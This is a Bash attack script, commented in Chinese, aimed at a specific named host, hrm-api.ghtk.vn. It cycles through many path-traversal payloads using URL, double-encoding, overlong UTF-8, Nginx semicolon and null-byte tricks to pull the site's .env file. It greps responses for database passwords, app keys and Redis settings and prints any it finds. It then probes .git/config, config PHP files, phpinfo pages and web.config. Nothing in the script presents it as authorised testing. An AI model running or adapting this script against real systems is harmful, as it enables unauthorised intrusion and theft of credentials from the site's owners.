#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 高级路径穿越 - 所有编码技巧"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="hrm-api.ghtk.vn"

# 高级路径穿越payload
PAYLOADS=(
    # 标准穿越
    "/.env"
    "/../.env"
    "/../../.env"
    "/../../../.env"
    "/../../../../.env"
    
    # URL编码
    "/%2e%2e/.env"
    "/%2e%2e%2f.env"
    "/..%2f.env"
    "/..%252f.env"
    "/%252e%252e/.env"
    
    # 双重编码
    "/%25252e%25252e/.env"
    
    # Unicode编码
    "/%c0%ae%c0%ae/.env"
    "/%c0%2e%c0%2e/.env"
    
    # Nginx特殊处理
    "/..;/.env"
    "/;/..;/..;/.env"
    "/static../.env"
    
    # 末尾空字节
    "/.env%00"
    "/../.env%00.jpg"
    
    # 长路径
    "/api/v1/../../.env"
    "/storage/logs/../../.env"
    "/public/../.env"
    
    # 反斜杠(Windows)
    "/..\\..\\..\\..env"
    
    # 混合技巧
    "/./././.env"
    "/.%2e/.env"
    "/.../.env"
)

echo "[*] 测试 .env 文件..."
for payload in "${PAYLOADS[@]}"; do
    echo -n "  $payload → "
    resp=$(curl -sk "https://$TARGET$payload" -m 2 2>&1)
    
    if echo "$resp" | grep -qE "APP_NAME|APP_KEY|DB_HOST|DB_PASSWORD|REDIS"; then
        echo "✅✅✅ 成功！"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "$resp"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        exit 0
    else
        echo "❌"
    fi
done

echo ""
echo "[*] 测试其他敏感文件..."
FILES=(
    "/.env.backup"
    "/.env.example"
    "/.env.old"
    "/config/database.php"
    "/config/app.php"
    "/.git/config"
    "/.git/HEAD"
    "/composer.json"
    "/composer.lock"
    "/.htaccess"
    "/phpinfo.php"
    "/info.php"
    "/web.config"
)

for file in "${FILES[@]}"; do
    for encoding in "" "%2e%2e/" "..;/"; do
        path="${encoding}${file}"
        resp=$(curl -sk "https://$TARGET/$path" -w "%{http_code}" -o /tmp/file_test -m 2 2>/dev/null)
        if [ "$resp" == "200" ] && [ -s /tmp/file_test ]; then
            echo "✅ $path → 200"
            head -20 /tmp/file_test
            echo "━━━"
        fi
    done
done

